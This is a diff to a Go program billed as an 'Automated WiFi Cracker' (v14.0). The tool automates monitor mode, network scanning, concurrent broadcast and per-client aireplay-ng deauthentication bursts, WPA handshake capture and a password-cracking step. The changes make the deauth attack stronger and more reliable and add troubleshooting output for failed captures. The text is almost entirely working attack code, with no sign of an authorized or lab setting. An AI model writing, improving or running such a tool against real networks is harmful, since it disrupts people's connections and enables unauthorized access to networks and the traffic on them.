@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"fmt"
 	"io"
 	"os"
@@ -12,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -47,7 +49,16 @@ var (
 // Main Entry Point
 // ==========================================
 func main() {
-	setupSignalHandler()
+	// Robust Ctrl+C Handling
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		fmt.Println()
+		red.Println("\n[!] Interrupted by user. Force cleaning up...")
+		forceCleanup()
+		os.Exit(0)
+	}()
 
 	if os.Geteuid() != 0 {
 		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
@@ -55,7 +66,7 @@ func main() {
 	}
 
 	cyan.Println("=======================================")
-	cyan.Println("    Automated WiFi Cracker CLI v9.0   ")
+	cyan.Println("    Automated WiFi Cracker CLI v14.0  ")
 	cyan.Println("=======================================")
 
 	setupEnvironment()
@@ -64,11 +75,12 @@ func main() {
 	monIface = iface + "mon"
 
 	yellow.Println("\n[*] Enabling Monitor Mode...")
+	runCmdSilent("systemctl", "stop", "NetworkManager")
 	runCmdSilent("airmon-ng", "check", "kill")
 	runCmdSilent("airmon-ng", "start", iface)
 	green.Println("[+] Monitor Mode enabled successfully.")
 
-	defer cleanup()
+	defer forceCleanup()
 
 	networks := scanNetworks()
 	target := selectTarget(networks)
@@ -97,9 +109,17 @@ func main() {
 
 	captureHandshake(target, capFile, targetDir)
 
-	if !verifyHandshake(capFile) {
+	isCaptured, debugInfo := verifyHandshake(capFile)
+	if !isCaptured {
 		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 5 minutes.")
-		cleanup()
+		yellow.Println("[*] Potential Reasons:")
+		yellow.Println("    1. Intel WiFi Adapters are weak at packet injection.")
+		yellow.Println("    2. Router has PMF (Protected Management Frames) enabled.")
+		yellow.Println("    3. Phone used a Random MAC address to reconnect.")
+
+		cyan.Println("\n=== Debug Output (aircrack-ng) ===")
+		fmt.Println(debugInfo)
+		fmt.Println("===================================")
 		os.Exit(1)
 	}
 
@@ -169,7 +189,7 @@ func findConnectedClients(target Network) Network {
 	scanFile := "client_scan_temp"
 	os.Remove(scanFile + "-01.csv")
 
-	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv")
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv", "--write-interval", "1")
 	cmd.Stdout = nil
 	cmd.Stderr = nil
 	cmd.Start()
@@ -229,7 +249,7 @@ func printClientTable(target Network) {
 }
 
 func captureHandshake(target Network, capFile string, targetDir string) {
-	// CRITICAL FIX: Delete old capture files so airodump-ng always writes to -01.cap
+	// Delete old capture files
 	oldFiles, _ := filepath.Glob(filepath.Join(targetDir, "handshake-*"))
 	for _, f := range oldFiles {
 		os.Remove(f)
@@ -237,47 +257,67 @@ func captureHandshake(target Network, capFile string, targetDir string) {
 
 	yellow.Println("\n[*] Starting Handshake Capture Process...")
 
-	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
+	// Start airodump-ng in background
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, "--write-interval", "1", monIface)
 	cmd.Stdout = nil
 	cmd.Stderr = nil
 	if err := cmd.Start(); err != nil {
 		red.Printf("[-] Failed to start capture: %v\n", err)
-		cleanup()
 		os.Exit(1)
 	}
 	activeCmds = append(activeCmds, cmd)
 
-	time.Sleep(3 * time.Second) // Lock channel
+	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
 
+	// --- SINGLE DEAUTH BURST TO ALL DEVICES ---
+	cyan.Println("\n[*] Sending Single Deauth Burst to ALL devices (One time only)...")
+
+	var wg sync.WaitGroup
+	sendDeauth := func(args []string) {
+		defer wg.Done()
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+		dCmd := exec.CommandContext(ctx, "aireplay-ng", args...)
+
+		// Show errors if injection fails
+		var stderr bytes.Buffer
+		dCmd.Stderr = &stderr
+		err := dCmd.Run()
+		if err != nil || stderr.Len() > 0 {
+			red.Printf("[-] Deauth Error: %s\n", strings.TrimSpace(stderr.String()))
+		}
+	}
+
+	// 1. Send Broadcast Deauth
+	wg.Add(1)
+	go sendDeauth([]string{"--deauth", "25", "-a", target.BSSID, "--ignore-negative-one", monIface})
+
+	// 2. Send Targeted Deauth to known clients concurrently
+	for _, clientMac := range target.Clients {
+		yellow.Printf("[-] Targeted Deauth -> %s\n", clientMac)
+		wg.Add(1)
+		go sendDeauth([]string{"--deauth", "25", "-a", target.BSSID, "-c", clientMac, "--ignore-negative-one", monIface})
+	}
+
+	wg.Wait() // Wait for the single burst to finish
+	green.Println("[+] Deauth burst sent successfully. Devices are disconnecting...")
+
+	// --- WAITING LOOP FOR HANDSHAKE ---
 	timeout := 5 * time.Minute
 	checkInterval := 15 * time.Second
 	elapsedTime := 0 * time.Second
 
-	yellow.Printf("\n[*] Starting 5-Minute Active Capture & Deauth Loop...\n")
+	yellow.Printf("\n[*] Waiting up to 5 minutes for devices to reconnect and handshake...\n")
+	yellow.Println("[!] TIP: If a device doesn't reconnect automatically, manually turn its WiFi OFF and ON.")
 
 	for elapsedTime < timeout {
-		// Send deauth to all clients every 15 seconds
-		cyan.Println("\n[*] Sending Deauth bursts to all connected devices...")
-		for _, clientMac := range target.Clients {
-			yellow.Printf("[-] Deauth -> %s\n", clientMac)
-			deauthArgs := []string{"--deauth", "5", "-a", target.BSSID, "-c", clientMac, monIface}
-			deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
-			deauthCmd.Stdout = nil
-			deauthCmd.Stderr = nil
-			deauthCmd.Run()
+		// Check if airodump-ng crashed
+		if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
+			red.Println("\n[-] ERROR: airodump-ng crashed unexpectedly!")
+			return
 		}
 
-		// Also send broadcast to catch random MACs
-		if len(target.Clients) == 0 || true {
-			yellow.Println("[-] Deauth -> Broadcast (All Devices)")
-			bArgs := []string{"--deauth", "5", "-a", target.BSSID, monIface}
-			bCmd := exec.Command("aireplay-ng", bArgs...)
-			bCmd.Stdout = nil
-			bCmd.Stderr = nil
-			bCmd.Run()
-		}
-
-		// Wait for devices to reconnect and handshake
+		// Wait 15 seconds before checking again
 		white.Print("[*] Listening for handshake")
 		for i := 0; i < 3; i++ {
 			time.Sleep(5 * time.Second)
@@ -286,26 +326,33 @@ func captureHandshake(target Network, capFile string, targetDir string) {
 		fmt.Println()
 		elapsedTime += checkInterval
 
-		if verifyHandshake(capFile) {
+		// Check if handshake is captured
+		isCaptured, _ := verifyHandshake(capFile)
+		if isCaptured {
 			green.Println("\n[+] Handshake detected! Stopping capture phase.")
 			if cmd.Process != nil {
 				cmd.Process.Kill()
-				cmd.Wait()
 			}
 			return
 		}
+
+		// Debug: Print file size to show packets are being captured
+		finalCapFile := capFile + "-01.cap"
+		if fi, err := os.Stat(finalCapFile); err == nil {
+			yellow.Printf("[*] Debug: Cap file size: %d bytes\n", fi.Size())
+		}
 	}
 
+	// Timeout reached
 	if cmd.Process != nil {
 		cmd.Process.Kill()
-		cmd.Wait()
 	}
 }
 
-func verifyHandshake(capFile string) bool {
+func verifyHandshake(capFile string) (bool, string) {
 	finalCapFile := capFile + "-01.cap"
 	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
-		return false
+		return false, "Cap file does not exist. airodump-ng might have failed to start."
 	}
 
 	cmd := exec.Command("aircrack-ng", finalCapFile)
@@ -314,7 +361,11 @@ func verifyHandshake(capFile string) bool {
 	cmd.Stderr = &buf
 	cmd.Run()
 
-	return strings.Contains(buf.String(), "1 handshake")
+	output := buf.String()
+	if strings.Contains(output, "1 handshake") {
+		return true, output
+	}
+	return false, output
 }
 
 func crackPassword(capFile string, targetDir string) {
@@ -372,12 +423,12 @@ func scanNetworks() []Network {
 	scanFile := "scan_temp"
 	os.Remove(scanFile + "-01.csv")
 
-	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
+	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv", "--write-interval", "1")
 	cmd.Stdout = nil
 	cmd.Stderr = nil
 	if err := cmd.Start(); err != nil {
 		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
-		cleanup()
+		forceCleanup()
 		os.Exit(1)
 	}
 	activeCmds = append(activeCmds, cmd)
@@ -393,7 +444,7 @@ func scanNetworks() []Network {
 	networks := parseCSV(scanFile + "-01.csv")
 	if len(networks) == 0 {
 		red.Println("[-] ERROR: No networks found.")
-		cleanup()
+		forceCleanup()
 		os.Exit(1)
 	}
 
@@ -413,7 +464,7 @@ func selectTarget(networks []Network) Network {
 		input, err := reader.ReadString('\n')
 		if err != nil {
 			red.Printf("[-] Failed to read input: %v\n", err)
-			cleanup()
+			forceCleanup()
 			os.Exit(1)
 		}
 
@@ -530,41 +581,23 @@ func setupEnvironment() {
 // System & Cleanup Utilities
 // ==========================================
 
-func setupSignalHandler() {
-	c := make(chan os.Signal, 1)
-	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-	go func() {
-		<-c
-		fmt.Println()
-		red.Println("\n[!] Interrupted by user. Cleaning up...")
-		cleanup()
-		os.Exit(1)
-	}()
-}
-
-func cleanup() {
-	yellow.Println("\n[*] Performing cleanup operations...")
-
+func forceCleanup() {
 	for _, cmd := range activeCmds {
 		if cmd != nil && cmd.Process != nil {
 			cmd.Process.Kill()
-			cmd.Wait()
 		}
 	}
 	activeCmds = nil
 
 	if monIface != "" {
-		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
 		runCmdSilent("airmon-ng", "stop", monIface)
 	}
 
-	yellow.Println("[*] Restarting NetworkManager...")
 	runCmdSilent("systemctl", "start", "NetworkManager")
 
 	os.Remove("scan_temp-01.csv")
 	os.Remove("client_scan_temp-01.csv")
-
-	green.Println("[+] Cleanup complete.")
+	green.Println("[+] Cleanup complete. Internet restored.")
 }
 
 func runCmd(name string, args ...string) {
